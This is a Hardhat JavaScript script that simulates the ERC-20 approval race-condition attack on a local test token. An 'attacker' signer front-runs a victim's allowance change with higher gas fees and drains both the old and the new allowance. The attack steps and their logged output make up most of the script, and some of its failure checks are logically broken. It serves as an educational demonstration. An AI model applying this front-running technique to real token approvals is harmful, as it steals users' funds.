const { ethers } = require("hardhat");

async function main() {
    // Get signers: owner, victim, attacker
    const [owner, victim, attacker] = await ethers.getSigners();

    console.log("===== Initializing Attack Simulation =====\n");
    console.log(`Owner Address:    ${owner.address}`);
    console.log(`Victim Address:   ${victim.address}`);
    console.log(`Attacker Address: ${attacker.address}\n`);

    // Deploy the CTUToken contract
    const CTUToken = await ethers.getContractFactory("CTUToken");
    const ctuToken = await CTUToken.deploy();
    await ctuToken.waitForDeployment();
    console.log(`CTUToken deployed at: ${ctuToken.target}\n`);

    // Define token amounts
    const transferAmount = ethers.parseUnits("300", 18);
    const approvalAmount = ethers.parseUnits("100", 18);
    const increasedApprovalAmount = ethers.parseUnits("200", 18);

    // Expected final balances
    const expectedVictimBalance = ethers.parseUnits("0", 18); // 300 - 100 - 200 = 0
    const expectedAttackerBalance = ethers.parseUnits("300", 18); // 0 + 100 + 200 = 300

    // Owner transfers 300 tokens to the victim
    const transferTx = await ctuToken.transfer(victim.address, transferAmount);
    const transferReceipt = await transferTx.wait();

    // Victim approves attacker to spend 100 tokens
    const approveTx = await ctuToken.connect(victim).approve(attacker.address, approvalAmount);
    const approveReceipt1 = await approveTx.wait();

    // Display Initial State
    console.log("===== Initial State =====");
    await displayState(ctuToken, victim, attacker);
    console.log("========================\n");

    // Step 3: Victim initiates approval to increase to 200 tokens
    console.log("=== Step 1: Victim Initiates Approval to Increase Allowance");
    console.log("=== Victim is sending a transaction to the mempool to approve 200 CTU for the attacker.\n");
    const approveTxIncreased = await ctuToken.connect(victim).approve(attacker.address, increasedApprovalAmount);

    // Print the state of the mempool
    await printMempool();

    console.log("=== Step 2: Attacker detects the pending approval and uses the existing allowance of 100 CTU to transfer tokens.");
    console.log("=== Attacker is frontrunning the transaction by setting higher fees.");

    // Increase maxFeePerGas and maxPriorityFeePerGas by 10 gwei
    const gasEstimate = await ethers.provider.getFeeData();
    const increasedMaxFeePerGas = gasEstimate.maxFeePerGas + (ethers.parseUnits('10', 'gwei'));
    const increasedMaxPriorityFeePerGas = gasEstimate.maxPriorityFeePerGas + (ethers.parseUnits('10', 'gwei'));

    // Attacker sends transferFrom using the old allowance, he is frontrunning the transaction, he sets the fees higher
    const txAttacker1 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, approvalAmount, {
        maxFeePerGas: increasedMaxFeePerGas,
        maxPriorityFeePerGas: increasedMaxPriorityFeePerGas,
    });

    await printMempool();

    // Wait until both transactions are mined
    await approveTxIncreased.wait();
    await txAttacker1.wait();

    console.log("Attacker transferred 100 CTU using the initial allowance.\n");
    console.log("Victims transaction is mined after being frontrunned by the attacker transferFrom transaction.\n");

    // Display State After Victim's Approval
    console.log("===== State After Victim's Approval =====");
    await displayState(ctuToken, victim, attacker);
    console.log("==========================================\n");

    console.log("=== Step 3: Attacker Utilizes Increased Approval");
    console.log("=== Attacker transfers an additional 200 CTU using the increased allowance.");
    // Transfer the remaining 200 tokens using the increased approval
    const txAttacker2 = await ctuToken.connect(attacker).transferFrom(victim.address, attacker.address, increasedApprovalAmount)
    // Wait until the transaction is mined
    await txAttacker2.wait();

    // Display Final State
    console.log("===== Final State =====");
    await displayState(ctuToken, victim, attacker);
    console.log("=======================\n");

    // Fetch actual final balances and allowance
    const finalVictimBalance = await ctuToken.balanceOf(victim.address);
    const finalAttackerBalance = await ctuToken.balanceOf(attacker.address);
    const finalAllowance = await ctuToken.allowance(victim.address, attacker.address);

    // Check if the attack was successful
    const isAttackSuccessful = finalVictimBalance == expectedVictimBalance &&
        finalAttackerBalance == expectedAttackerBalance &&
        finalAllowance == 0;

    if (isAttackSuccessful) {
        console.log("===== Attack Successful =====");
        console.log("The attack has successfully exploited the approval race condition.");
        console.log(`Final Victim Balance: ${ethers.formatUnits(finalVictimBalance, 18)} CTU`);
        console.log(`Final Attacker Balance: ${ethers.formatUnits(finalAttackerBalance, 18)} CTU`);
        console.log(`Final Allowance: ${ethers.formatUnits(finalAllowance, 18)} CTU\n`);
    } else {
        console.log("===== Attack Failed =====");
        console.log("The attack did not execute as expected. Details below:");

        // Detailed failure reasons
        if (!finalVictimBalance == expectedVictimBalance) {
            console.log(`- Victim's balance is ${ethers.formatUnits(finalVictimBalance, 18)} CTU, expected ${ethers.formatUnits(expectedVictimBalance, 18)} CTU.`);
        }
        if (!finalAttackerBalance == expectedAttackerBalance) {
            console.log(`- Attacker's balance is ${ethers.formatUnits(finalAttackerBalance, 18)} CTU, expected ${ethers.formatUnits(expectedAttackerBalance, 18)} CTU.`);
        }
        if (!finalAllowance == 0) {
            console.log(`- Allowance is ${ethers.formatUnits(finalAllowance, 18)} CTU, expected 0 CTU.`);
        }

        // Additional Logs for Debugging
        console.log("\n===== Detailed Final State =====");
        await displayState(ctuToken, victim, attacker);
        console.log("================================\n");
    }

    console.log("===== Attack Simulation Completed =====");

    // Uncomment to print all the information about the mined blocks
    // await printAllBlocksInfo();
}

// Helper function to display current state
async function displayState(ctuToken, victim, attacker) {
    const victimBalance = ethers.formatUnits(await ctuToken.balanceOf(victim.address), 18);
    const attackerBalance = ethers.formatUnits(await ctuToken.balanceOf(attacker.address), 18);
    const allowance = ethers.formatUnits(await ctuToken.allowance(victim.address, attacker.address), 18);
    console.log(`Victim Balance:             ${victimBalance} CTU`);
    console.log(`Attacker Balance:           ${attackerBalance} CTU`);
    console.log(`Allowance (Victim->Attacker): ${allowance} CTU`);
}

// Helper function to log transaction details
function logTransactionDetails(title, tx, receipt) {
    console.log(`===== ${title} =====`);
    console.log(`Transaction Hash: ${tx.hash}`);
    console.log(`Block Number:     ${receipt.blockNumber}`);
    console.log(`Block Hash:       ${receipt.blockHash}`);
    console.log(`Gas Used:         ${receipt.gasUsed.toString()}`);
    console.log(`Status:           ${receipt.status === 1 ? "Success" : "Failed"}`);
    if (receipt.events && receipt.events.length > 0) {
        console.log("Events Emitted:");
        receipt.events.forEach((event, index) => {
            console.log(`  Event ${index + 1}: ${event.event}`);
            console.log(`    Arguments: ${JSON.stringify(event.args)}`);
        });
    }
    console.log("========================\n");
}

// Helper function to print pending transactions
async function printMempool() {
    const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
        "pending",
        false,
    ]);
    for (const tx of pendingBlock.transactions) {
        const txData = await network.provider.send("eth_getTransactionByHash", [tx]);
        console.log(`Transaction Hash: ${txData.hash}`);
        console.log(`From:             ${txData.from}`);
        console.log(`To:               ${txData.to}`);
        console.log(`Value:            ${ethers.formatUnits(txData.value, "ether")} ETH`);
        console.log(`Gas Price:        ${ethers.formatUnits(txData.gasPrice, "gwei")} GWEI`);
        console.log(`Gas:              ${Number(txData.gas)}`);
        console.log(`Input:            ${txData.input}`);
        console.log(`Max Fee Per Gas:  ${ethers.formatUnits(txData.maxFeePerGas, "gwei")} GWEI`);
        console.log(`Max Priority Fee: ${ethers.formatUnits(txData.maxPriorityFeePerGas, "gwei")} GWEI`);
        // console.log(`Transaction Object: ${JSON.stringify(txData, null, 2)}`);
        console.log("------------------------------------------\n");
    }
}

// Helper function to print the information about the last block
async function printLastBlockInfo() {
    const lastBlock =  await hre.ethers.provider.getBlock("latest");
    console.log("===== Block Mined =====");
    console.log(`Block Number:     ${lastBlock.number}`);
    console.log(`Block Hash:       ${lastBlock.hash}`);
    console.log(`Parent Hash:      ${lastBlock.parentHash}`);
    console.log(`Timestamp:        ${new Date(lastBlock.timestamp * 1000).toLocaleString()}`);
    console.log(`Transactions:     ${lastBlock.transactions.length}`);
    console.log(`Validator:        ${lastBlock.miner}`); // Changed from Miner to Validator
    console.log(`Gas Limit:        ${ethers.formatUnits(lastBlock.gasLimit, "gwei")} GWEI`);
    console.log(`Gas Used:         ${ethers.formatUnits(lastBlock.gasUsed, "gwei")} GWEI`);
    console.log(`Base Fee Per Gas: ${ethers.formatUnits(lastBlock.baseFeePerGas, "gwei")} GWEI`);
    console.log("==================================\n");

    // Print transactions, their hashes, and order
    console.log("===== Transactions in Last Block =====");
    const transactions = await Promise.all(lastBlock.transactions.map(txHash => ethers.provider.getTransaction(txHash)));
    transactions.sort((a, b) => a.nonce - b.nonce);
    for (const tx of transactions) {
        console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
    }
    
    console.log("======================================\n");
}

// Helper function to print information about all blocks
async function printAllBlocksInfo() {
    const latestBlockNumber = await hre.ethers.provider.getBlockNumber();  // Get the latest block number
    console.log(`Printing all blocks starting from block 0 to block ${latestBlockNumber}...\n`);

    // Loop through each block and print its details
    for (let blockNumber = 0; blockNumber <= latestBlockNumber; blockNumber++) {
        const block = await hre.ethers.provider.getBlock(blockNumber);
        console.log("===== Block Information =====");
        console.log(`Block Number:     ${block.number}`);
        console.log(`Block Hash:       ${block.hash}`);
        console.log(`Parent Hash:      ${block.parentHash}`);
        console.log(`Timestamp:        ${new Date(block.timestamp * 1000).toLocaleString()}`);
        console.log(`Transactions:     ${block.transactions.length}`);
        console.log(`Validator:        ${block.miner || block.validator}`);  // Use 'miner' or 'validator' depending on the network
        console.log(`Gas Limit:        ${ethers.formatUnits(block.gasLimit, "gwei")} GWEI`);
        console.log(`Gas Used:         ${ethers.formatUnits(block.gasUsed, "gwei")} GWEI`);
        console.log(`Base Fee Per Gas: ${ethers.formatUnits(block.baseFeePerGas || 0, "gwei")} GWEI`);
        console.log("==============================\n");

        // If the block has transactions, print them
        if (block.transactions.length > 0) {
            console.log("===== Transactions in Block =====");
            // Fetch and display transaction details
            const transactions = await Promise.all(block.transactions.map(txHash => hre.ethers.provider.getTransaction(txHash)));
            transactions.sort((a, b) => a.nonce - b.nonce); // Sort by nonce
            for (const tx of transactions) {
                console.log(`Nonce: ${tx.nonce}, Transaction Hash: ${tx.hash}`);
                console.log(`From: ${tx.from}`);
                console.log(`To: ${tx.to}`);
                console.log(`Value: ${ethers.formatUnits(tx.value, "ether")} ETH`);
                console.log(`Gas Price: ${ethers.formatUnits(tx.gasPrice, "gwei")} GWEI`);
                console.log("-------------------------------");
            }
            console.log("================================\n");
        }
    }
    console.log("===== Block Printing Completed =====");
}


main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error("An error occurred during the attack simulation:");
        console.error(error);
        process.exit(1);
    });
